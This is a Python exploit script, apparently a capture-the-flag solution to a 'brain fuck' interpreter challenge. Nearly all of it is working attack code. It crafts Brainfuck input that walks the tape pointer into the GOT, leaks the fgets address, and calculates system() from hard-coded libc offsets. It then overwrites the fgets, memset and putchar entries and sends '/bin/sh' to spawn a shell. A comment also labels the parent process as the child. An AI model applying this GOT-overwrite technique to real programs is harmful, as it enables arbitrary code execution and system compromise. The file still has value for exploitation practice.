import sys, os, struct

# Build Payload

# move pointer to got.plt fgets
payload = "<"*(0x0804a0a0 - 0x0804a010)
# read fgets address
payload += ".>"*4 
# move pointer back to got.plt fgets
payload += "<"*4
# write system() to fgets
payload += ",>"*4 
# move pointer to got.plt memset
payload += ">"*((0x0804a02c-0x0804a010)-4)
# write memset to fgets address
payload += ",>"*4
# move to putchar() but already here
# write pointer to main() -0x08048671 
payload += ",>"*4
# call putchar which is now main
payload += "."
payload += "\r\n"

pipe1_input, pipe1_output = os.pipe()
pipe2_input, pipe2_output = os.pipe()

pid = os.fork()
if pid:
	# Child
	os.close(pipe1_output)
	os.close(pipe2_input)
	os.dup2(pipe2_output, 1)
	os.dup2(pipe1_input, 0)
	#os.close(pipe2_output)
	#os.close(pipe1_input)
	os.execv("/home/raw/Documents/pwnable/rookis/brain_fuck/bf", ["./bf"])
else:
	os.close(pipe1_input)
	os.close(pipe2_output)
	output = os.read(pipe2_input, 512)
	print output
	os.write(pipe1_output, payload)
	
	print '[*] sending payload'
	output = os.read(pipe2_input, 512)
	fgets_address = struct.unpack("<I", output[0:4])[0]
	print '[*] fgets address = 0x%08x' % fgets_address

	# from libc.so.6
	system_offset = 0x00041490
	fgets_offset = 0x069df0
 	system_address = fgets_address - (fgets_offset - system_offset)
	print "[*] system at 0x%08x" % system_address

	print '[*] overwriting got.plt fget() address with system() address'
	os.write(pipe1_output, struct.pack("<I", system_address))
	
	print '[*] overwriting got.plt memset with fgets address'
	os.write(pipe1_output, struct.pack("<I", fgets_address))
	
	print '[*] overwriting got.plt putchar with main()-0x08048671'
	os.write(pipe1_output, struct.pack("<I", 0x08048671))


	os.write(pipe1_output, "/bin/sh")

	
